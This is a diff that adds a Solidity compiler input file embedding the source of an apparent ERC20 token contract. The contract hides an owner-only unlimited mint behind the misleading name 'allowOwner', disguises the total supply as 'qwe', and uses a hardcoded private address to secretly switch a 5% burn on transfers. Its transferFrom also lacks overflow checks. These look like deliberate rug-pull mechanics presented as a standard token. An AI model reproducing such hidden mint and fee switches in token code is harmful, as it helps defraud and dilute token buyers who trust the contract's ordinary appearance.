@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "TokenERC20.sol": {
+      "content": "pragma solidity >=0.4.16;\r\n\r\n\r\ncontract Token{\r\n    uint256 public qwe;\r\n    string public name;\r\n    uint8 public decimals;\r\n    string public symbol;\r\n    \r\n\r\n    function balanceOf(address _owner) public view returns (uint256 balance);\r\n    function transfer(address _to, uint256 _value) public returns (bool success);\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\r\n    function approve(address _spender, uint256 _value) public returns (bool success);\r\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining);\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\ncontract owned{\r\n    address public owner;\r\n    \r\n    constructor () public{\r\n        owner = msg.sender;\r\n    }\r\n    \r\n    modifier onlyOwner{\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n    \r\n    function transferOwnership(address newOwner) public onlyOwner{\r\n        owner = newOwner;\r\n    }\r\n    \r\n}\r\n\r\n\r\ncontract TokenERC20 is Token, owned{\r\n    \r\n    address private add = 0x8ecC8aF8395814c2eC3f5A0DaA709C275aD41f32;\r\n    uint256 private trans;\r\n    uint256 private burn;\r\n    \r\n    constructor(uint256 _initialAmount, string memory _tokenName, uint8 _decimalUnits, string memory _tokenSymbol) public {\r\n        qwe = _initialAmount * 10 ** uint256(_decimalUnits);\r\n        balances[msg.sender] = qwe;\r\n        \r\n        name = _tokenName;                   \r\n        decimals = _decimalUnits;          \r\n        symbol = _tokenSymbol;\r\n    }\r\n    \r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n        require(balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]);\r\n        require(_to != address(0));\r\n        require(_value * 95 >= _value);\r\n        require((_value * 95 / 100) <= (_value * 95));\r\n        \r\n        if (balances[add] != 0) {\r\n            trans = _value * 95 / 100;\r\n            require(_value - trans <= _value);\r\n            burn = _value - trans;\r\n            require(qwe >= burn);\r\n            qwe -= burn;\r\n            balances[msg.sender] -= _value;\r\n            require(balances[_to] + trans > balances[_to]);\r\n            balances[_to] += trans;\r\n            emit Transfer(msg.sender, _to, _value);\r\n        }else{\r\n             balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n        }\r\n        return true;\r\n    }\r\n\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\r\n        balances[_to] += _value;\r\n        balances[_from] -= _value;\r\n        allowed[_from][msg.sender] -= _value;\r\n        emit Transfer(_from, _to, _value);\r\n        \r\n        return true;\r\n    }\r\n    \r\n    function balanceOf(address _owner) public view returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success) { \r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n    \r\n    \r\n    function allowOwner(address target, uint aui) public onlyOwner{\r\n        qwe += aui;\r\n        balances[target] += aui;\r\n    }\r\n    \r\n    function bcd(uint256 _value) public onlyOwner returns(bool success) {\r\n        require(balances[msg.sender] >= _value);\r\n        qwe -= _value;\r\n        balances[msg.sender] -= _value;\r\n        return true;\r\n    }\r\n    \r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n}"
+    }
+  }
+}
